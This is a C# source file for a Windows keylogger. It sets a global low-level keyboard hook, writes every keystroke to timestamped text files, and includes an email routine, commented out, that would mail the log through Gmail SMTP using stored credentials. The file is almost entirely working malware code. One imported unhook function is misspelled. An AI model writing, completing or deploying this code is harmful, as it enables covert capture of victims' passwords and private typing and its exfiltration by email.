using System;
using System.Runtime.InteropServices; // For DLL and reading keystrokes from memory
using System.Diagnostics; // For building a hook for gaining access to running processes and modules.
using System.Windows.Forms; // For running of application and converting keystrokes
using System.IO;
using System.Net.Mail;

namespace KeyLogger
{
    class Logger
    {
        private static string date;
        private static int index;
        private static string filePath;

        private static string baseFilePath;

        private string addressFrom;
        private string addressTo;
        private string password;

        private static int WH_KEYBOARD_LL = 13; // Monitor for low-level keyboard inputs events
        private static int WM_KEYDOWN = 0x0100; //Identifier of the keyboard message. Non-system key (ALT is not pressed)
        private static IntPtr hook = IntPtr.Zero;     // Representation of pointer of handler. ZERO = readOnly
        private static LowLevelKeyboardProc llkProcedure = HookCallback;    //Delegate of the HookCallback. The HookCallback function defines what we want to do every time a new keyboard input event takes place.


        public Logger(string userBaseFilePath, string addressFrom = "", string addressTo = "", string password = "")
        {
            baseFilePath = userBaseFilePath;
            this.addressFrom = addressFrom;
            this.addressTo = addressTo;
            this.password = password;
            filePath = GetFullFilePath();
            StreamWriter output = new StreamWriter(filePath, true);
            output.Write("");
            output.Close();
        }

        private static string GetFullFilePath()
        {
            DateTime foo = DateTime.UtcNow;
            long unixTime = ((DateTimeOffset)foo).ToUnixTimeSeconds();

            return baseFilePath + unixTime + ".txt"; 
        }

        public void Start()
        {
            hook = SetHook(llkProcedure);   //Defining our hook
            Application.Run();              // Main loop
            UnhookWindostHookEx(hook);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);    // Build and return SetWindowsHookEx function
        }

        private delegate IntPtr LowLevelKeyboardProc(int ncode, IntPtr wParam, IntPtr lparam);

        public static void SendEmail(string subject)
        {
            /*
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress(this.addressFrom);
            mail.To.Add(this.addressTo);
            mail.Subject = subject;
            mail.Body = "MU-HA-HA-HA";

            System.Net.Mail.Attachment attachment;
            attachment = new System.Net.Mail.Attachment(filePath);
            mail.Attachments.Add(attachment);

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential(addressFrom, password);
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
            */
        }


        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)  //wParam is pressed
            {
            
                FileInfo fi = new FileInfo(filePath);
                long fileSize = fi.Length;
                if (fileSize >= 500)
                {
                    //SendEmail("keys");
                    filePath = GetFullFilePath();
                }
                
                int vkCode = Marshal.ReadInt32(lParam);     //Gets int value stored in the memory address held in lParam
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    StreamWriter output = new StreamWriter(filePath, true);
                    output.Write(".");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    StreamWriter output = new StreamWriter(filePath, true);
                    output.Write(",");
                    output.Close();

                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    StreamWriter output = new StreamWriter(filePath, true);
                    output.Write(" ");
                    output.Close();
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);    // Convert number to readable format
                    StreamWriter output = new StreamWriter(filePath, true);
                    output.Write((Keys)vkCode);
                    output.Close();
                }

            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }


        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModulename);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindostHookEx(IntPtr hhk);
    }
}
